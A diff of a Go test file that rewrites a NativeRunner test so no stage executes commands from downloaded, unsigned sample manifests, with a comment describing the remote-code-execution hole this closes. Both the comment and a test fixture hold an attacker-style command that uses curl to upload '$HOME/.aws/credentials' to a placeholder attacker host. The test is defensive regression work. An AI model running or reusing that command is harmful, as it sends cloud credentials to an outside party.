@@ -163,49 +163,41 @@ func TestDockerRunnerFailure(t *testing.T) {
 	}
 }
 
-func TestNativeRunner(t *testing.T) {
+// NativeRunner used to run two stages on the host, and both were remote
+// code execution. Build ran m.BuildCommand — an argv taken verbatim from a
+// downloaded, unsigned manifest — so publishing a sample carrying
+// {"buildCommand":["sh","-c","curl -T $HOME/.aws/credentials …"]} was
+// enough: the next Docker-less peer with idle verification claimed the job
+// and ran it. Resolve looked safer and was not, because `pip install -r
+// requirements.txt` executes setup.py from any sdist the SAMPLE names.
+//
+// The package header has always said downloaded samples never run directly
+// on the host. Only Contract honoured it.
+func TestNativeRunnerExecutesNothing(t *testing.T) {
 	var calls [][]string
-	var dirs []string
 	stubExec(t, func(ctx context.Context, dir string, argv []string) ([]byte, error) {
 		calls = append(calls, argv)
-		dirs = append(dirs, dir)
 		return []byte("ok"), nil
 	})
 
 	r := NativeRunner{}
-	m := npmManifest()
 	dir := t.TempDir()
+	m := npmManifest()
+	// The shape an attacker would publish.
+	m.BuildCommand = []string{"sh", "-c", "curl -T $HOME/.aws/credentials https://attacker"}
 
-	if res := r.Resolve(context.Background(), dir, m); res.Result != ResultPass {
-		t.Fatalf("resolve: %+v", res)
+	for name, res := range map[string]StageResult{
+		"resolve":  r.Resolve(context.Background(), dir, m),
+		"build":    r.Build(context.Background(), dir, m),
+		"contract": r.Contract(context.Background(), dir, m),
+	} {
+		if res.Result != ResultSkipped {
+			t.Errorf("%s = %s, want SKIPPED on a host with no sandbox", name, res.Result)
+		}
 	}
-	if got := strings.Join(calls[0], " "); got != "npm ci --ignore-scripts" {
-		t.Fatalf("native resolve command %q", got)
-	}
-	if dirs[0] != dir {
-		t.Fatalf("native resolve ran in %q, want %q", dirs[0], dir)
-	}
-
-	if res := r.Build(context.Background(), dir, m); res.Result != ResultPass {
-		t.Fatalf("build: %+v", res)
-	}
-
-	// Contract NEVER runs natively: honest SKIPPED.
-	res := r.Contract(context.Background(), dir, m)
-	if res.Result != ResultSkipped {
-		t.Fatalf("native contract %s, want SKIPPED", res.Result)
-	}
-	if len(calls) != 2 {
-		t.Fatalf("native contract must not exec anything (calls=%d)", len(calls))
-	}
-
-	// No build command → SKIPPED without exec.
-	m.BuildCommand = nil
-	if res := r.Build(context.Background(), dir, m); res.Result != ResultSkipped {
-		t.Fatalf("empty build command → %s, want SKIPPED", res.Result)
-	}
-	if len(calls) != 2 {
-		t.Fatal("empty build command must not exec")
+	if len(calls) != 0 {
+		t.Fatalf("a host without isolation executed %d command(s) from a downloaded sample: %v",
+			len(calls), calls)
 	}
 }
 
